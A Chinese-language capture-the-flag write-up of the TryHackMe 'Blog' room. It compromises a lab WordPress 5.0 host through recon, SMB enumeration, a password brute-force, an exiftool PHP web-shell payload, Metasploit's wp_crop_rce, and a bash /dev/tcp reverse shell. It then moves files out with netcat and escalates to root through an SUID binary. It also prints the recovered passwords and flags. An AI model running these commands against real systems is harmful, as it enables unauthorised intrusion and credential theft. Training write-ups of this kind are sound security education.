# Blog Writeup
> URL : https://tryhackme.com/room/blog

IP : 10.10.175.75

## Recon
- 老梗先用 rustscan 掃一下
	- `rustscan -a 10.10.175.75`
	- ![](https://i.imgur.com/OtN6JLT.png)
	- 可以看出開的 port 有
		- 22
		- 80
		- 139
		- 445
- 接下來用 nmap 做進一步的掃瞄
	- `nmap -A -p22,80,139,445 10.10.175.75`
	- ![](https://i.imgur.com/PbaV27j.png)
	- 可以看出
		- http-generator: WordPress 5.0
- What version of the above CMS was being used?
	- `5.0`
- What CMS was Billy using?
	- `WordPress`
## Web
- 在文章內容中，可以看到有兩個作者
	- Billy Joel
		- 帳號 :`bjoel`
	- Karen Wheeler
		- 帳號 : `kwheel`
		- Joel 的媽媽
- 發現網頁會自動跳轉到 `blog.thm` 
	- 這是 Wordpress 的一個問題，第一次進入就會在 DB 寫死 Domain name 並自動跳轉
	- ![](https://i.imgur.com/mpMQnDY.png)
	- 我們可以透過修改 `/etc/hosts` 把 IP 綁上 domain
		- `sudo vim /etc/hosts`
		- 裡面加上一行 `10.10.175.75 blog.thm`
- 用 dirsearch 掃一次看看
	- `python3 dirsearch.py -u http://blog.thm/`
	- 沒有什麼特別的結果，就是 Wordpress 該有的東西而已
- 使用 WPScan，一款針對 Wordpress 的掃描器
	- 可以掃描出該網站有使用哪一些套件等
	- `wpscan --update`
	- `wpscan --url http://blog.thm`
	- ![](https://i.imgur.com/IH2DsaZ.png)
	```
	└─$ wpscan --url http://blog.thm
	_______________________________________________________________
			 __          _______   _____
			 \ \        / /  __ \ / ____|
			  \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
			   \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
				\  /\  /  | |     ____) | (__| (_| | | | |
				 \/  \/   |_|    |_____/ \___|\__,_|_| |_|

			 WordPress Security Scanner by the WPScan Team
							 Version 3.8.17
		   Sponsored by Automattic - https://automattic.com/
		   @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
	_______________________________________________________________

	[+] URL: http://blog.thm/ [10.10.175.75]
	[+] Started: Sat Aug  7 01:16:33 2021

	Interesting Finding(s):

	[+] Headers
	 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
	 | Found By: Headers (Passive Detection)
	 | Confidence: 100%

	[+] robots.txt found: http://blog.thm/robots.txt
	 | Interesting Entries:
	 |  - /wp-admin/
	 |  - /wp-admin/admin-ajax.php
	 | Found By: Robots Txt (Aggressive Detection)
	 | Confidence: 100%

	[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 100%
	 | References:
	 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
	 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
	 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

	[+] WordPress readme found: http://blog.thm/readme.html
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 100%

	[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 100%

	[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
	 | Found By: Direct Access (Aggressive Detection)
	 | Confidence: 60%
	 | References:
	 |  - https://www.iplocation.net/defend-wordpress-from-ddos
	 |  - https://github.com/wpscanteam/wpscan/issues/1299

	[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
	 | Found By: Rss Generator (Passive Detection)
	 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
	 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

	[+] WordPress theme in use: twentytwenty
	 | Location: http://blog.thm/wp-content/themes/twentytwenty/
	 | Last Updated: 2021-07-22T00:00:00.000Z
	 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
	 | [!] The version is out of date, the latest version is 1.8
	 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
	 | Style Name: Twenty Twenty
	 | Style URI: https://wordpress.org/themes/twentytwenty/
	 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
	 | Author: the WordPress team
	 | Author URI: https://wordpress.org/
	 |
	 | Found By: Css Style In Homepage (Passive Detection)
	 | Confirmed By: Css Style In 404 Page (Passive Detection)
	 |
	 | Version: 1.3 (80% confidence)
	 | Found By: Style (Passive Detection)
	 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

	[+] Enumerating All Plugins (via Passive Methods)

	[i] No plugins Found.

	[+] Enumerating Config Backups (via Passive and Aggressive Methods)
	 Checking Config Backups - Time: 00:00:16 <===============================================================================================================================================> (137 / 137) 100.00% Time: 00:00:16

	[i] No Config Backups Found.

	[!] No WPScan API Token given, as a result vulnerability data has not been output.
	[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

	[+] Finished: Sat Aug  7 01:17:25 2021
	[+] Requests Done: 170
	[+] Cached Requests: 7
	[+] Data Sent: 40.812 KB
	[+] Data Received: 322.273 KB
	[+] Memory used: 213.184 MB
	[+] Elapsed time: 00:00:51

	```
- 可以發現 `wp-content/oploads` 目錄沒有鎖
	- ![](https://i.imgur.com/8svkMhr.png)

- 前面有發現 Wordpress 的版本是 5.0
	- 上 searchsploit 尋找看看有沒有可以用的 Exploit
	- ![](https://i.imgur.com/XdhUTF7.png)
	- `wget https://www.exploit-db.com/download/49512 -O 49512.py`
	- 然而執行起來發現需要帳號密碼，所以就暫時先放一邊

## SMB
- 前面 nmap 發現他有開 SMB 的 port
	- 來掃看看 `smbmap -H blog.thm`
	- 可以發現有開一個Disk 叫做BillySMB
		- ![](https://i.imgur.com/VVCQqzB.png)
- 也可以用 `smbclient -L //blog.thm` 列出裡面的資訊
	- 由於 SMB 可以使用匿名登入，所以詢問密碼只要直接按下 Enter即可
	- ![](https://i.imgur.com/LK2gmK3.png)
- 如上截圖，發現會出現一個 SMB1 Disable 的 錯誤
	- 依照下列網址方式處理
		- https://dalemazza.wordpress.com/2020/04/20/nt_status_io_timeout-smb-error-and-how-to-fix-it/
	- 修改 `/etc/samba/smb.conf`
		- ![](https://i.imgur.com/aQYUaqq.png)
		- 在 `[global]` 裡面增加一行
			- `client min protocol = NT1`
	- 就可以正常使用ㄌ
	- ![](https://i.imgur.com/hBH947C.png)
- 輸入 `smbclient -N '//blog/thm/BillySMB'`
	- 可以直接進入 SMB 的 CLI
		- ![](https://i.imgur.com/OuYvUAB.png)
	- 輸入 `ls` 觀察裡面的資料
		- ![](https://i.imgur.com/hs2h6dq.png)
	- 輸入 `get {檔名}` 依序把檔案拔出來
		- ![](https://i.imgur.com/IovRpfM.png)
	- 發現裡面有一張 QR Code
		- 網路上找一個 QR 轉換器
			- ![](https://i.imgur.com/9vX5G7o.png)
		- 然而只是一個普通的 Youtube 連結
	- 其他也都只是滿無聊的圖檔，沒有什麼特別
## 爆破密碼
- 爆破密碼很無聊，但有時候很有用
	- 針對 Wordpress 可以用 `wpscan` 內建的爆破方法
		- 我們先準備一個 `user.txt` 裡面有兩行，分別是兩個使用者
			- `bjoel`
			- `kwheel`
		- `wpscan --url http://blog.thm/ -U user.txt -P /opt/rockyou.txt`
			- 接下來使用 `-U` 配使用者名稱檔案
			- `-P` 配密碼字典檔
	- 來未看先猜一下，爆出來比較有機會的是 `kwheel`
		- 因為是開發者的媽媽，老人家資安意識比較差
		- ~~抱歉我就歧視~~
- 等了十幾分鐘，真的成功的爆出了密碼!!
	- ![](https://i.imgur.com/tsmDBHk.png)
		- `kwheel` / `cutiepie1`
		- `果然老人家愛用弱密碼`
- 接下來到 `/wp-admin` 準備登入
	- ![](https://i.imgur.com/BsDUBsd.png)
	- 也就真的順利登入了!!
		- ![](https://i.imgur.com/d4ssuZc.png)
	- 不過我們的使用者是 `editor`
	- 沒有權限可以修改 template 之類的方法取得 RCE

## 嘗試 exploit-db 的 Payload (失敗)
- 先講結論，失敗了，我也不知道為什麼 QQ
	- 我已經完全照著網路上的方法做
	- 但是還是怪怪ㄉ QQ
- 使用先前載好的 https://www.exploit-db.com/download/49512 
- 依照提示準備一個 `gd.jpg`
	- `cp Alice-White-Rabbit.jpg gd.jpg`
	- 這邊我直接使用 smb 偷出來的圖片
- 用 exiftool 寫入 shell
	- ```exiftool gd.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"```
	- ![](https://i.imgur.com/F5TuZD8.png)
	- 在這邊我們可以用 strings 觀察，檔案真的被寫進去了
		- ![](https://i.imgur.com/HRcbPDx.png)
- 修改原始碼的 `lhost` 與 `lport`
	- ![](https://i.imgur.com/2aBtMmn.png)
	- `python3 49512.py http://blog.thm/ kwheel cutiepie1 twentytwenty`
	- `nc -nvlp 7877`
    - 然而，都失敗了QQQ
 
## 使用大絕招 msf !!
 - 輸入 `msfconsole`
    - `use exploit/multi/http/wp_crop_rce`
    - `show options`
 		- 觀察需要的參數
	- `set PASSWORD cutiepie1`
    - `set USERNAME kwheel`
    - `set RHOSTS blog.thm`
    - `set LHOST 10.13.21.55`
    - `exploit`
		- ![](https://i.imgur.com/KDy6Yfs.png)
    - 就成功接上了 meterpreter 的 shell
        - 但這邊我還是想使用普通的 reverse shell
        - 所以我們就輸入 `shell` 切換進入
- 再來我想接回 reverse shell
    - 在攻擊機輸入 `nc -nvlp 7877`
    - meterpreter 輸入`bash -c 'bash -i >& /dev/tcp/10.13.21.55/7877 0>&1'`
    - 就可以順利接回 shell
        - 然而在使用者的家目錄看到的 `user.txt` 是假的 QQ
            - ![](https://i.imgur.com/2866L1g.png)
        - 沒關係，我現在懶得找，等有 root 後再說ㄅ
- 觀察使用者家目錄有一個 pdf 檔案，抓出來研究看看
    - 攻擊機 `nc -l -p 1234 > Billy_Joel_Termination_May20-2020.pdf`
    - 靶機 `nc 10.13.21.55 1234 < Billy_Joel_Termination_May20-2020.pdf`
    - 然而裡面是一封沒有很重要的 pdf

## 準備提權
- 使用常常出現的工具 linpeas
    - `wget 10.13.21.55:8000/linpeas.sh`
    - `bash linpeas.sh`
    - 我們可以找到 wordpress 的資料庫密碼
        - ![](https://i.imgur.com/1oLP7fH.png)
        - `LittleYellowLamp90!@`
    - 發現 sudo 版本是 1.8.21
        - ![](https://i.imgur.com/P09KTRL.png)
    - 發現一個奇怪的檔案有 `suid`
        - 檔案路徑是 `/usr/sbin/checker`
        - ![](https://i.imgur.com/c9aV2V5.png)
- 觀察 Checker
    - 先把檔案傳出來
        - 攻擊機 `nc -l -p 1234 > checker`
        - 靶機 `nc 10.13.21.55 1234 < checker`
    - 使用 `r2` 分析
        - `r2 checker`
        - `aaa`
        - `s main`
        - `VV`
        - ![](https://i.imgur.com/SrIENP9.png)
        - 可以發現他會把 `admin` 傳入 `getenv`
        - 然後如果有值就會給我們一個 shell
- 回到攻擊機，給予一個 `admin` 的環境變數
    - `admin=meow /usr/sbin/checker`
    - 就拿到 root shell 了
    - ![](https://i.imgur.com/4XC0m19.png)
- 取得 root flag
    - ![](https://i.imgur.com/7NKvSBB.png)
    - `9a0b2b618bef9bfa7ac28c1353d9f318`
- 等等 ... 阿user flag ㄋ
    - 好懶得翻ㄛ...我們就暴力搜ㄅ
    - `find / -iname user.txt -print 2>/dev/null`
        - ![](https://i.imgur.com/c1mpsB0.png)
    - 可以找到 user flag 藏在 `/media/usb/user.txt`
        - ![](https://i.imgur.com/DbGCDlx.png)
        - `c8421899aae571f7af486492b71a8ab7`
- 打完收工!
- 